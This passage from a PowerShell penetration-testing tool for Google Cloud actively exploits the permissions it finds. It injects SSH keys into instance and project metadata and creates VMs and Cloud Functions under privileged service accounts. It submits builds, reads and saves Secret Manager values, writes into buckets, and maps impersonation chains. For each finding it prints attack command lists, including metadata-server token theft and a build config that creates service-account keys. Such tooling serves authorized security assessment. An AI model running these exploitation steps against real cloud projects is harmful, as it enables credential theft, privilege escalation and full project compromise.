                        $instSARoles = Get-SARolesOnProject -SAEmail $instSA -Project $Project
                        if ($instSARoles -and $instSARoles.Count -gt 0) {
                            $instSARolesStr = Format-RolesWithPerms -Roles $instSARoles
                        }
                        else {
                            $instSARolesStr = "(roles unknown)"
                        }
                        $saContext = "Instance runs as SA: $instSA | Roles: $instSARolesStr"
                    }
                    else {
                        $saContext = "No SA attached"
                    }

                    if ($scopes -match "cloud-platform") {
                        $scopeInfo = "FULL cloud-platform scope - SA has unrestricted API access"
                    }
                    else {
                        $scopeList = $scopes -join ', '
                        $scopeInfo = "Limited scopes: $scopeList"
                    }

                    $isCritical = $instSA -and ($scopes -match "cloud-platform")
                    $severity = if ($isCritical) { "CRITICAL" } else { "HIGH" }

                    $steps = @(
                        "Confirmed metadata write on instance $name in zone $zone",
                        "Attacker injects an SSH public key via instance metadata",
                        "SSH into the instance using the injected key",
                        $saContext,
                        $scopeInfo,
                        "From the instance, query the metadata server for the SA's OAuth token",
                        "Use the token for GCP API calls as $instSA"
                    )
                    $commands = @(
                        "# 1. Generate SSH key",
                        "ssh-keygen -t rsa -b 2048 -f pentest_key -N ''",
                        "",
                        "# 2. Inject SSH key into instance metadata",
                        "gcloud compute instances add-metadata $name --zone=$zone --project=$Project --metadata-from-file ssh-keys=ssh_keys.txt",
                        "",
                        "# 3. SSH into instance (if network allows)",
                        "gcloud compute ssh pentest@$name --zone=$zone --project=$Project --ssh-key-file=pentest_key",
                        "",
                        "# 4. On the instance - get SA token from metadata server",
                        "curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                        "",
                        "# 5. Use the token",
                        "TOKEN=`$(curl ... | jq -r .access_token)",
                        "curl -H 'Authorization: Bearer `$TOKEN' https://cloudresourcemanager.googleapis.com/v1/projects/$Project"
                    )

                    Record-Chain -ChainID $chainID -Project $Project `
                        -Title "Compute Instance Metadata Write: $name" `
                        -Severity $severity `
                        -InitialAccess "Current identity has compute.instances.setMetadata on $name" `
                        -TargetPrivilege "SSH key injection -> shell access -> metadata server -> SA token ($instSA)" `
                        -Steps $steps `
                        -Commands $commands `
                        -Impact "Shell access to $name, then SA impersonation via metadata server. SA=$instSA. $scopeInfo" `
                        -Proof "Metadata write confirmed (pentest-probe-key added)"

                    $scopeList = $scopes -join ', '
                    Write-Proof "[$chainID] Metadata write on $name confirmed`nSA: $instSA | Scopes: $scopeList`n"

                    # Clean up
                    Run-GcloudRaw "compute instances remove-metadata $name --zone=$zone --project=$Project --keys=pentest-probe-key" | Out-Null
                }
                else {
                    Write-Log "    DENIED: setMetadata on $name" "FAIL"
                }
            }
        }
        else {
            Write-Log "    Skipping active metadata test on $name ($Mode mode)" "TEST"
        }
    }

    # --- Test: Project-wide metadata ---
    if ($Mode -eq "Aggressive") {
        Write-Log "  [COMPUTE] Testing project-wide setCommonInstanceMetadata..." "WARN"
        $r = Run-GcloudRaw "compute project-info describe --project=$Project --format=json"
        if ($r.success) {
            $testR = Run-GcloudRaw "compute project-info add-metadata --project=$Project --metadata=pentest-project-probe=probe"
            if ($testR.success) {
                $chainID = "COMPUTE-PROJMETA-$Project"
                $steps = @(
                    "Project-wide metadata write confirmed on $Project",
                    "Adding an SSH key to project metadata gives SSH access to ALL instances that don't block project-level keys",
                    "Each instance's SA token becomes accessible via the metadata server",
                    "This is a single-action compromise of all compute instances in the project"
                )
                $commands = @(
                    "# Inject SSH key into ALL instances at once",
                    "gcloud compute project-info add-metadata --project=$Project --metadata-from-file ssh-keys=ssh_keys.txt"
                )
                Record-Chain -ChainID $chainID -Project $Project `
                    -Title "Project-Wide Metadata Write CONFIRMED" `
                    -Severity "CRITICAL" `
                    -InitialAccess "Current identity has compute.projects.setCommonInstanceMetadata" `
                    -TargetPrivilege "SSH key injection into ALL instances in the project simultaneously" `
                    -Steps $steps `
                    -Commands $commands `
                    -Impact "MASS COMPROMISE: SSH access to every VM in $Project, with access to all attached SA tokens."

                Record-Artifact -Type "PROJECT_METADATA" -Project $Project -Detail "Added project-wide metadata key pentest-project-probe"
                Run-GcloudRaw "compute project-info remove-metadata --project=$Project --keys=pentest-project-probe" | Out-Null
            }
        }
    }

    # --- Test: Instance creation with privileged SA ---
    if ($Mode -eq "Aggressive" -and $SAs.Count -gt 0) {
        Write-Log "  [COMPUTE] Testing instance creation with privileged SAs..." "WARN"

        $targetSA = $null
        foreach ($sa in $SAs) {
            $roles = Get-SARolesOnProject -SAEmail $sa.email -Project $Project
            if ($roles -match "owner|editor") {
                $targetSA = $sa.email
                break
            }
        }
        if (-not $targetSA -and $SAs.Count -gt 0) {
            $defaultSA = $SAs | Where-Object { $_.is_default } | Select-Object -First 1
            if ($defaultSA) { $targetSA = $defaultSA.email }
        }

        if ($targetSA) {
            $testZone = if ($Instances.Count -gt 0) { $Instances[0].zone } else { "us-central1-a" }
            $vmName = "pentest-probe-$(Get-Random -Maximum 99999)"
            Write-Log "    Testing: create instance $vmName as $targetSA in $testZone" "WARN"

            $r = Run-GcloudRaw "compute instances create $vmName --zone=$testZone --project=$Project --service-account=$targetSA --scopes=cloud-platform --machine-type=e2-micro --no-address --metadata=startup-script='echo PENTEST_PROBE' --format=json"

            if ($r.success) {
                $vmSARoles = Get-SARolesOnProject -SAEmail $targetSA -Project $Project
                if ($vmSARoles -and $vmSARoles.Count -gt 0) {
                    $vmSARolesStr = Format-RolesWithPerms -Roles $vmSARoles
                }
                else {
                    $vmSARolesStr = "(unknown)"
                }

                $chainID = "COMPUTE-CREATE-$Project"
                $steps = @(
                    "Created VM $vmName in $testZone running as $targetSA",
                    "SA roles on this project: $vmSARolesStr",
                    "VM has cloud-platform scope (unrestricted API access)",
                    "SSH into the VM and query the metadata server for the SA token",
                    "All GCP API calls now execute as $targetSA"
                )
                $commands = @(
                    "gcloud compute instances create evil-vm --zone=$testZone --project=$Project --service-account=$targetSA --scopes=cloud-platform --machine-type=e2-micro",
                    "gcloud compute ssh evil-vm --zone=$testZone --project=$Project",
                    "# On VM: curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
                )

                Record-Chain -ChainID $chainID -Project $Project `
                    -Title "VM Created as Privileged SA: $targetSA" `
                    -Severity "CRITICAL" `
                    -InitialAccess "Current identity has compute.instances.create + iam.serviceAccounts.actAs on $targetSA" `
                    -TargetPrivilege "Code execution as $targetSA with full cloud-platform scope. SA roles: $vmSARolesStr" `
                    -Steps $steps `
                    -Commands $commands `
                    -Impact "Full code execution as $targetSA. SA roles: $vmSARolesStr. If SA has Editor/Owner, this is complete project compromise."

                Record-Artifact -Type "VM" -Project $Project -Detail "Created VM $vmName in $testZone as $targetSA"
                Write-Log "    Cleaning up probe VM $vmName ..." "WARN"
                Run-GcloudRaw "compute instances delete $vmName --zone=$testZone --project=$Project --quiet" | Out-Null
            }
            else {
                Write-Log "    DENIED: Cannot create instance as $targetSA (need actAs + create)" "FAIL"
            }
        }
    }
}


# ---------- Module 6: Cloud Functions / Cloud Run Abuse ----------
function Test-ServerlessAbuse {
    param([string]$Project, $Functions, $RunServices, $SAs)
    $dir = "$OutputDir\$Project\serverless_abuse"
    Ensure-Dir $dir

    Write-Log "  [SERVERLESS] Testing Cloud Functions & Cloud Run abuse..." "TEST"

    # --- Cloud Functions: update existing function ---
    if ($Functions -and $Functions.Count -gt 0 -and $Mode -eq "Aggressive") {
        foreach ($fn in $Functions) {
            $fnShort = $fn.short
            $fnRegion = $fn.region
            $fnSA = $fn.sa

            Write-Log "    Testing function update on $fnShort (SA: $fnSA)" "WARN"

            $r = Run-GcloudRaw "functions describe $fnShort --region=$fnRegion --project=$Project --format=json"
            if ($r.success) {
                $testR = Run-GcloudRaw "functions deploy $fnShort --region=$fnRegion --project=$Project --update-env-vars PENTEST_PROBE=1 --format=json"
                if ($testR.success) {
                    $fnSARoles = Get-SARolesOnProject -SAEmail $fnSA -Project $Project
                    if ($fnSARoles -and $fnSARoles.Count -gt 0) {
                        $fnSARolesStr = Format-RolesWithPerms -Roles $fnSARoles
                    }
                    else {
                        $fnSARolesStr = "(unknown)"
                    }

                    $chainID = "FUNC-UPDATE-$Project-$fnShort"
                    $steps = @(
                        "Function $fnShort in $fnRegion runs as SA $fnSA",
                        "SA roles on this project: $fnSARolesStr",
                        "Attacker can update the function source code",
                        "Deploy code that reads the SA token from metadata and exfils it",
                        "Or deploy code that performs privileged GCP API calls directly"
                    )
                    $fnRuntime = $fn.runtime
                    $commands = @(
                        "# Update the function with new source",
                        "gcloud functions deploy $fnShort --region=$fnRegion --project=$Project --source=./malicious_source/ --runtime=$fnRuntime",
                        "# Invoke to get token",
                        "gcloud functions call $fnShort --region=$fnRegion --project=$Project"
                    )

                    Record-Chain -ChainID $chainID -Project $Project `
                        -Title "Cloud Function Update: $fnShort (SA: $fnSA)" `
                        -Severity "CRITICAL" `
                        -InitialAccess "Current identity has cloudfunctions.functions.update + iam.serviceAccounts.actAs" `
                        -TargetPrivilege "Arbitrary code execution as $fnSA (roles: $fnSARolesStr)" `
                        -Steps $steps `
                        -Commands $commands `
                        -Impact "Code execution as $fnSA. Roles: $fnSARolesStr. Function already has network access and SA credentials."

                    Record-Artifact -Type "FUNCTION_UPDATE" -Project $Project -Detail "Updated env var on function $fnShort"
                    Run-GcloudRaw "functions deploy $fnShort --region=$fnRegion --project=$Project --remove-env-vars PENTEST_PROBE" | Out-Null
                }
            }
        }
    }

    # --- Cloud Functions: new function deployment capability ---
    if ($Mode -eq "Aggressive" -and $SAs.Count -gt 0) {
        $defaultSAObj = $SAs | Where-Object { $_.is_default } | Select-Object -First 1
        $targetSA = if ($defaultSAObj) { $defaultSAObj.email } else { $SAs[0].email }

        if ($targetSA) {
            $projData = $Script:Manifest.projects[$Project]
            $cfEnabled = $projData -and ($projData.enabled_apis -contains "cloudfunctions.googleapis.com")

            if ($cfEnabled) {
                $callerRoles = @()
                foreach ($binding in $projData.iam_bindings) {
                    foreach ($m in $binding.members) {
                        if ($m -match [regex]::Escape($Script:Manifest.caller_account)) {
                            $callerRoles += $binding.role
                        }
                    }
                }
                $canCreate = @($callerRoles | Where-Object { $_ -match "owner|editor|cloudfunctions\.admin|cloudfunctions\.developer" })
                if ($canCreate.Count -gt 0) {
                    $callerRolesStr = Format-RolesWithPerms -Roles $canCreate
                    $targetSARoles = Get-SARolesOnProject -SAEmail $targetSA -Project $Project
                    if ($targetSARoles -and $targetSARoles.Count -gt 0) {
                        $targetSARolesStr = Format-RolesWithPerms -Roles $targetSARoles
                    }
                    else {
                        $targetSARolesStr = "(unknown)"
                    }

                    $chainID = "FUNC-CREATE-$Project"
                    $steps = @(
                        "Current identity has function creation capability via: $callerRolesStr",
                        "Cloud Functions API is enabled on this project",
                        "Target SA for deployment: $targetSA",
                        "Target SA roles: $targetSARolesStr",
                        "Deployed function would execute as the SA with full credential access"
                    )
                    $commands = @(
                        "gcloud functions deploy pentest-probe --runtime=python311 --trigger-http --allow-unauthenticated --source=probe_fn/ --entry-point=handler --service-account=$targetSA --project=$Project --region=us-central1"
                    )

                    Record-Chain -ChainID $chainID -Project $Project `
                        -Title "Cloud Function Deployment Possible as $targetSA" `
                        -Severity "HIGH" `
                        -InitialAccess "Current identity has cloudfunctions.functions.create via $callerRolesStr" `
                        -TargetPrivilege "Deploy function as $targetSA (roles: $targetSARolesStr) for code execution" `
                        -Steps $steps `
                        -Commands $commands `
                        -Impact "Arbitrary code execution as $targetSA (roles: $targetSARolesStr). Combined with actAs, this chains to the SA's full privileges."
                }
            }
        }
    }

    # --- Cloud Run: note SA contexts ---
    if ($RunServices -and $RunServices.Count -gt 0) {
        foreach ($svc in $RunServices) {
            if ($svc.sa) {
                Write-Log "    Cloud Run service $($svc.name) runs as $($svc.sa) (noted for chain building)" "TEST"
            }
        }
    }
}


# ---------- Module 7: Cloud Build Abuse ----------
function Test-CloudBuildAbuse {
    param([string]$Project, $BuildTriggers)
    $dir = "$OutputDir\$Project\cloudbuild_abuse"
    Ensure-Dir $dir

    Write-Log "  [CLOUDBUILD] Testing Cloud Build abuse..." "TEST"

    $projData = $Script:Manifest.projects[$Project]
    $cbEnabled = $projData -and ($projData.enabled_apis -contains "cloudbuild.googleapis.com")
    if (-not $cbEnabled) {
        Write-Log "    Cloud Build API not enabled, skipping" "FAIL"
        return
    }

    if ($Mode -ne "Probe") {
        $buildConfig = @{
            steps = @(
                @{
                    name = "gcr.io/cloud-builders/gcloud"
                    args = @("version")
                }
            )
        }
        $configFile = "$dir\probe_build.json"
        $buildConfig | ConvertTo-Json -Depth 10 | Set-Content $configFile

        if ($Mode -eq "Aggressive") {
            Write-Log "    [AGGRESSIVE] Submitting probe build..." "WARN"

            $r = Run-GcloudRaw "builds submit --no-source --config=`"$configFile`" --project=$Project --format=json --async"
            if ($r.success) {
                $chainID = "CLOUDBUILD-$Project"

                $projNum = ""
                $pInfo = Run-GcloudJson "projects describe $Project"
                if ($pInfo) { $projNum = $pInfo.projectNumber }
                $cbSA = "${projNum}@cloudbuild.gserviceaccount.com"

                $cbSARoles = Get-SARolesOnProject -SAEmail $cbSA -Project $Project
                if ($cbSARoles -and $cbSARoles.Count -gt 0) {
                    $cbSARolesStr = Format-RolesWithPerms -Roles $cbSARoles
                }
                else {
                    $cbSARolesStr = "roles/editor + iam.serviceAccounts.actAs (typical defaults - could not confirm from manifest)"
                }

                $steps = @(
                    "Build submission confirmed on project $Project",
                    "Cloud Build SA: $cbSA",
                    "SA roles on this project: $cbSARolesStr",
                    "Attacker submits a build that reads the SA token from the metadata server",
                    "Or the build step directly calls gcloud to create SA keys, modify IAM, etc.",
                    "The Cloud Build SA can then impersonate ANY service account in the project"
                )
                $commands = @(
                    "# cloudbuild.yaml that exfils the build SA's token + creates an owner SA key",
                    "# steps:",
                    "#   - name: gcr.io/cloud-builders/gcloud",
                    "#     entrypoint: bash",
                    "#     args:",
                    "#       - -c",
                    "#       - |",
                    "#         curl -s -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                    "#         gcloud iam service-accounts keys create /workspace/key.json --iam-account=TARGET_SA@$Project.iam.gserviceaccount.com",
                    "",
                    "gcloud builds submit --no-source --config=cloudbuild.yaml --project=$Project"
                )

                Record-Chain -ChainID $chainID -Project $Project `
                    -Title "Cloud Build Submission CONFIRMED" `
                    -Severity "CRITICAL" `
                    -InitialAccess "Current identity has cloudbuild.builds.create" `
                    -TargetPrivilege "Arbitrary command execution as Cloud Build SA ($cbSA). SA roles: $cbSARolesStr" `
                    -Steps $steps `
                    -Commands $commands `
                    -Impact "CRITICAL: Cloud Build SA has near-Owner privileges. Full project compromise via SA key creation, IAM modification, secret access, and more." `
                    -Proof "Build submitted successfully (async)"

                Record-Artifact -Type "CLOUD_BUILD" -Project $Project -Detail "Submitted probe build"
            }
            else {
                Write-Log "    DENIED: Cannot submit builds" "FAIL"
            }
        }
        else {
            $r = Run-GcloudRaw "builds list --project=$Project --limit=1 --format=json"
            if ($r.success) {
                Write-Log "    Can list builds - cloudbuild.builds.list confirmed" "OK"
            }
        }
    }

    if ($BuildTriggers) {
        foreach ($trigger in $BuildTriggers) {
            if (-not $trigger.sa) {
                Write-Log "    Trigger '$($trigger.name)' uses DEFAULT Cloud Build SA (Editor-like)" "OK"
            }
        }
    }
}


# ---------- Module 8: Secret Manager Brute-Force ----------
function Test-SecretAccess {
    param([string]$Project, $Secrets)
    $dir = "$OutputDir\$Project\secret_access"
    Ensure-Dir $dir

    Write-Log "  [SECRETS] Brute-forcing access to $($Secrets.Count) secrets..." "TEST"

    if (-not $Secrets -or $Secrets.Count -eq 0) { return }

    $chainNum = 0
    foreach ($secret in $Secrets) {
        $secretName = $secret.name
        Write-Log "    Testing secretmanager.versions.access on $secretName" "TEST"

        $r = Run-GcloudRaw "secrets versions access latest --secret=$secretName --project=$Project"
        if ($r.success) {
            $chainNum++
            $chainID = "SECRET-$Project-$chainNum"

            $value = $r.stdout
            if ($value.Length -gt 80) {
                $truncated = $value.Substring(0, 80) + "...[TRUNCATED]"
            }
            else {
                $truncated = $value
            }

            # Classify secret type
            $secretType = "Unknown"
            if ($value -match '"type"\s*:\s*"service_account"') { $secretType = "GCP Service Account Key JSON" }
            elseif ($value -match "^-----BEGIN") { $secretType = "Private Key / Certificate" }
            elseif ($value -match "^(AIza|ya29\.|GOOG)") { $secretType = "GCP API Key / Token" }
            elseif ($value -match "(password|passwd|pwd)\s*[:=]") { $secretType = "Password / Credential" }
            elseif ($value -match "^(ghp_|github_pat_)") { $secretType = "GitHub Token" }
            elseif ($value -match "^(xox[bpras]-)") { $secretType = "Slack Token" }
            elseif ($value -match "^sk-") { $secretType = "API Key (possibly OpenAI/Stripe)" }
            elseif ($value -match "mongodb\+srv://|postgres://|mysql://") { $secretType = "Database Connection String" }

            $severity = if ($secretType -match "Service Account Key|Private Key|Password|Database") { "CRITICAL" } else { "HIGH" }

            # Build context-aware steps
            $steps = @(
                "Accessed secret '$secretName' in project $Project",
                "Secret type identified as: $secretType"
            )
            if ($secretType -eq "GCP Service Account Key JSON") {
                $steps += "This is a GCP SA key - can be used to authenticate as that SA for persistent access"
            }
            if ($secretType -match "Database") {
                $steps += "This is a database connection string - direct database access possible"
            }
            if ($secretType -match "GitHub") {
                $steps += "This is a GitHub token - source code access and potential supply chain attack"
            }

            $commands = @(
                "gcloud secrets versions access latest --secret=$secretName --project=$Project"
            )
            if ($secretType -eq "GCP Service Account Key JSON") {
                $commands += ""
                $commands += "# Activate the SA key:"
                $commands += "gcloud secrets versions access latest --secret=$secretName --project=$Project > sa_key.json"
                $commands += "gcloud auth activate-service-account --key-file=sa_key.json"
            }

            Record-Chain -ChainID $chainID -Project $Project `
                -Title "Secret Accessible: $secretName ($secretType)" `
                -Severity $severity `
                -InitialAccess "Current identity has secretmanager.versions.access on $secretName" `
                -TargetPrivilege "Secret value retrieved - type: $secretType" `
                -Steps $steps `
                -Commands $commands `
                -Impact "Credential theft. Secret type: $secretType. May enable lateral movement, external system access, or further privilege escalation." `
                -Proof "Value preview: $truncated"

            $safeSecretName = $secretName -replace '[^a-zA-Z0-9_-]', '_'
            Save-Output "$dir\secret_value_$safeSecretName.txt" $value
            Write-Proof "[$chainID] Secret: $secretName | Type: $secretType`nPreview: $truncated`n"
        }
        else {
            Write-Log "    DENIED: Cannot access $secretName" "FAIL"
        }
    }
}


# ---------- Module 9: Storage Brute-Force ----------
function Test-StorageAccess {
    param([string]$Project, $Buckets)
    $dir = "$OutputDir\$Project\storage_access"
    Ensure-Dir $dir

    Write-Log "  [STORAGE] Testing access to $($Buckets.Count) buckets..." "TEST"

    if (-not $Buckets -or $Buckets.Count -eq 0) { return }

    $chainNum = 0
    foreach ($bucket in $Buckets) {
        Write-Log "    Testing gs://$bucket ..." "TEST"

        # Test read
        $canRead = $false
        try {
            $lsOut = gsutil ls "gs://$bucket/" 2>&1 | Select-Object -First 10
            $lsErr = @($lsOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
            $canRead = (-not ($lsErr -match "AccessDeniedException|403"))
        }
        catch { }

        # Test write
        $canWrite = $false
        if ($Mode -ne "Probe") {
            try {
                $probeFile = "$dir\_write_probe.tmp"
                Set-Content -Path $probeFile -Value "pentest-probe-$(Get-Date -Format 'o')"
                $rndNum = Get-Random
                $cpOut = gsutil cp $probeFile "gs://$bucket/.pentest-probe-$rndNum.tmp" 2>&1
                $cpErr = @($cpOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
                $canWrite = (-not ($cpErr -match "AccessDeniedException|403|Forbidden"))
                Remove-Item $probeFile -ErrorAction SilentlyContinue
                if ($canWrite) {
                    $probeObj = @($cpOut | Where-Object { $_ -match "gs://" }) -replace '.*?(gs://\S+).*', '$1'
                    if ($probeObj) { gsutil rm $probeObj 2>$null }
                    Record-Artifact -Type "BUCKET_WRITE" -Project $Project -Detail "Write probe to $bucket (cleaned up)"
                }
            }
            catch { }
        }

        if ($canRead -or $canWrite) {
            $chainNum++
            $chainID = "STORAGE-$Project-$chainNum"
            $access = @()
            if ($canRead) { $access += "READ" }
            if ($canWrite) { $access += "WRITE" }
            $accessStr = $access -join " + "

            $interestingFiles = @()
            if ($canRead) {
                try {
                    $allObjects = gsutil ls -r "gs://$bucket/" 2>&1 | Select-Object -First 200
                    $patterns = @("\.env", "\.key", "\.pem", "\.p12", "\.json", "credential", "secret", "password", "\.tfstate", "\.sql", "backup", "\.bak")
                    foreach ($obj in $allObjects) {
                        foreach ($pat in $patterns) {
                            if ($obj -match $pat) {
                                $interestingFiles += $obj
                                break
                            }
                        }
                    }
                    Save-Output "$dir\bucket_listing_$bucket.txt" ($allObjects -join "`n")
                }
                catch { }
            }

            $severity = if ($canWrite) { "HIGH" } elseif ($interestingFiles.Count -gt 0) { "HIGH" } else { "MEDIUM" }

            # Build steps
            $steps = @("Confirmed $accessStr access to bucket gs://$bucket")
            if ($interestingFiles.Count -gt 0) {
                $steps += "Found $($interestingFiles.Count) potentially sensitive files"
            }
            else {
                $steps += "No obvious sensitive files in top-level listing"
            }
            if ($canWrite) {
                $steps += "WRITE access enables: injecting malicious scripts into deployment pipelines, tampering with Terraform state, poisoning data, or planting backdoors"
            }
            if ($canRead -and $interestingFiles.Count -gt 0) {
                $topFiles = ($interestingFiles | Select-Object -First 10 | ForEach-Object { ($_ -split '/')[-1] }) -join ', '
                $steps += "Interesting files: $topFiles"
            }

            # Build commands
            $commands = @(
                "gsutil ls -r gs://$bucket/",
                "gsutil cp gs://$bucket/path/to/secret.json ."
            )
            if ($canWrite) {
                $commands += "gsutil cp payload.txt gs://$bucket/payload.txt"
            }

            $impactExtra = ""
            if ($interestingFiles.Count -gt 0) {
                $impactExtra = " $($interestingFiles.Count) interesting files found."
            }

            if ($canWrite) {
                $privStr = "Write access - potential for supply chain attack, data tampering, or deploying malicious objects"
            }
            else {
                $privStr = "Read access - potential for data exfiltration and credential discovery"
            }

            Record-Chain -ChainID $chainID -Project $Project `
                -Title "Bucket Access ($accessStr): gs://$bucket" `
                -Severity $severity `
                -InitialAccess "Current identity has $accessStr on gs://$bucket" `
                -TargetPrivilege $privStr `
                -Steps $steps `
                -Commands $commands `
                -Impact "Data access on gs://$bucket. $accessStr confirmed.$impactExtra"

            if ($interestingFiles.Count -gt 0) {
                Save-Output "$dir\interesting_files_$bucket.json" @($interestingFiles)
            }
        }
        else {
            Write-Log "    No access to gs://$bucket" "FAIL"
        }
    }
}


# ---------- Module 10: BigQuery Access ----------
function Test-BigQueryAccess {
    param([string]$Project, $Datasets)
    $dir = "$OutputDir\$Project\bigquery_access"
    Ensure-Dir $dir

    Write-Log "  [BQ] Testing BigQuery access for $($Datasets.Count) datasets..." "TEST"

    if (-not $Datasets -or $Datasets.Count -eq 0) { return }

    $chainNum = 0
    foreach ($ds in $Datasets) {
        Write-Log "    Testing ${Project}:${ds}" "TEST"

        try {
            $tablesRaw = bq ls --format=json "${Project}:${ds}" 2>&1
            $tablesErr = @($tablesRaw | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
            $tablesOut = @($tablesRaw | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join ""

            if (-not ($tablesErr -match "Access Denied|403") -and $tablesOut) {
                $tables = $tablesOut | ConvertFrom-Json
                $chainNum++
                $chainID = "BQ-$Project-$chainNum"

                $sampleTable = $null
                $sampleResult = ""
                if ($tables -and $tables.Count -gt 0) {
                    $tblName = $tables[0].tableReference.tableId
                    $sampleTable = $tblName
                    try {
                        $qResult = bq query --format=json --max_rows=1 --use_legacy_sql=false "SELECT * FROM ``$Project.$ds.$tblName`` LIMIT 1" 2>&1
                        $qOut = @($qResult | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] }) -join ""
                        if ($qOut) { $sampleResult = "Query succeeded - data readable" }
                    }
                    catch { }
                }

                $tableNames = ($tables | ForEach-Object { $_.tableReference.tableId }) -join ', '

                $steps = @(
                    "Listed $($tables.Count) tables in dataset ${Project}:${ds}",
                    "Tables: $tableNames"
                )
                if ($sampleResult) {
                    $steps += "Sample query on table ${sampleTable}: $sampleResult"
                }

                $commands = @(
                    "bq ls ${Project}:${ds}",
                    "bq query --use_legacy_sql=false 'SELECT * FROM ``$Project.$ds.TABLE_NAME`` LIMIT 100'"
                )

                Record-Chain -ChainID $chainID -Project $Project `
                    -Title "BigQuery Dataset Accessible: $ds ($($tables.Count) tables)" `
                    -Severity "MEDIUM" `
                    -InitialAccess "Current identity has bigquery.tables.list (and possibly .getData) on $ds" `
                    -TargetPrivilege "Read access to $($tables.Count) BigQuery tables in dataset $ds. $sampleResult" `
                    -Steps $steps `
                    -Commands $commands `
                    -Impact "Data access: $($tables.Count) tables in $ds. May contain PII, credentials, business data."

                Save-Output "$dir\tables_$ds.json" $tables
            }
            else {
                Write-Log "    DENIED: Cannot access $ds" "FAIL"
            }
        }
        catch {
            Write-Log "    Error accessing $ds : $_" "ERROR"
        }
    }
}


# ---------- Module 11: Delegation Chain Discovery ----------
function Test-DelegationChains {
    param([string]$Project, $SAs)
    $dir = "$OutputDir\$Project\delegation_chains"
    Ensure-Dir $dir

    Write-Log "  [DELEGATION] Analyzing SA-to-SA delegation chains..." "TEST"

    if (-not $SAs -or $SAs.Count -lt 2) { return }

    # Build a graph: for each SA, who can impersonate it?
    $graph = @{}
    $projData = $Script:Manifest.projects[$Project]

    foreach ($sa in $SAs) {
        $saEmail = $sa.email
        $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
        $saPolicyFile = "$EnumDir\$Project\service_accounts\sa_policy_$safeEmail.json"
        if (Test-Path $saPolicyFile) {
            try {
                $raw = Get-Content $saPolicyFile -Raw
                if ($raw -and $raw -ne "# No data returned") {
                    $saPolicy = $raw | ConvertFrom-Json
                    if ($saPolicy.bindings) {
                        foreach ($binding in $saPolicy.bindings) {
                            if ($binding.role -match "serviceAccountUser|serviceAccountTokenCreator|workloadIdentityUser") {
                                foreach ($member in $binding.members) {
                                    if (-not $graph.ContainsKey($saEmail)) { $graph[$saEmail] = @() }
                                    $graph[$saEmail] += @{ member = $member; role = $binding.role }
                                }
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }

    if ($graph.Count -eq 0) {
        Write-Log "    No SA impersonation relationships found" "FAIL"
        return
    }

    Save-Output "$dir\impersonation_graph.json" $graph

    $chainNum = 0
    foreach ($targetSA in $graph.Keys) {
        $targetRoles = Get-SARolesOnProject -SAEmail $targetSA -Project $Project
        $targetIsPriv = $targetRoles -match "owner|editor|admin"
        if ($targetRoles -and $targetRoles.Count -gt 0) {
            $targetRolesStr = Format-RolesWithPerms -Roles $targetRoles
        }
        else {
            $targetRolesStr = "(no project-level roles found)"
        }

        foreach ($source in $graph[$targetSA]) {
            $sourceMember = $source.member
            $sourceRolePerms = Get-RolePrivEscPerms -Role $source.role
            $sourceRolePermStr = ""
            if ($sourceRolePerms.Count -gt 0) {
                $permList = $sourceRolePerms -join ', '
                $sourceRolePermStr = " (privesc: $permList)"
            }

            # Multi-hop: check if source is itself an SA that someone else can impersonate
            $sourceEmail = $sourceMember -replace '^serviceAccount:', ''
            if ($graph.ContainsKey($sourceEmail)) {
                foreach ($hop2Source in $graph[$sourceEmail]) {
                    $hop2RolePerms = Get-RolePrivEscPerms -Role $hop2Source.role
                    $hop2RolePermStr = ""
                    if ($hop2RolePerms.Count -gt 0) {
                        $hop2PermList = $hop2RolePerms -join ', '
                        $hop2RolePermStr = " (privesc: $hop2PermList)"
                    }
                    $chainNum++
                    $chainID = "DELEGATION-$Project-$chainNum"
                    $severity = if ($targetIsPriv) { "CRITICAL" } else { "HIGH" }

                    $steps = @(
                        "Hop 1: $($hop2Source.member) has $($hop2Source.role)$hop2RolePermStr on $sourceEmail",
                        "Hop 2: $sourceMember has $($source.role)$sourceRolePermStr on $targetSA",
                        "Target SA roles: $targetRolesStr",
                        "Via implicit delegation, the initial identity can obtain a token as $targetSA"
                    )
                    $commands = @(
                        "# Multi-hop impersonation using delegation",
                        "gcloud auth print-access-token --impersonate-service-account=$targetSA --delegates=$sourceEmail"
                    )
                    $impactStr = "Multi-hop privilege escalation via SA delegation chain."
                    if ($targetIsPriv) {
                        $impactStr += " Target SA has elevated privileges: $targetRolesStr"
                    }

                    Record-Chain -ChainID $chainID -Project $Project `
                        -Title "Multi-Hop Delegation Chain to $targetSA" `
                        -Severity $severity `
                        -InitialAccess "$($hop2Source.member) can impersonate $sourceEmail via $($hop2Source.role)$hop2RolePermStr" `
                        -TargetPrivilege "Chain: $($hop2Source.member) -> $sourceEmail -> $targetSA (roles: $targetRolesStr)" `
                        -Steps $steps `
                        -Commands $commands `
                        -Impact $impactStr
                }
            }

            # Single-hop chain from current caller
            if ($sourceMember -match [regex]::Escape($Script:Manifest.caller_account)) {
                $chainNum++
                $chainID = "DELEGATION-$Project-$chainNum"
                $severity = if ($targetIsPriv) { "CRITICAL" } else { "MEDIUM" }

                $steps = @(
                    "Current identity is granted $($source.role)$sourceRolePermStr on $targetSA",
                    "Can directly impersonate this SA via getAccessToken or actAs",
                    "Target SA roles: $targetRolesStr"
                )
                $commands = @(
                    "gcloud auth print-access-token --impersonate-service-account=$targetSA"
                )
                $impactStr = "Direct SA impersonation."
                if ($targetIsPriv) {
                    $impactStr += " Target SA has: $targetRolesStr - this is a significant escalation."
                }

                Record-Chain -ChainID $chainID -Project $Project `
                    -Title "Direct Impersonation Path to $targetSA" `
                    -Severity $severity `
                    -InitialAccess "Current identity ($sourceMember) has $($source.role)$sourceRolePermStr on $targetSA" `
                    -TargetPrivilege "Direct impersonation of $targetSA (roles: $targetRolesStr)" `
                    -Steps $steps `
                    -Commands $commands `
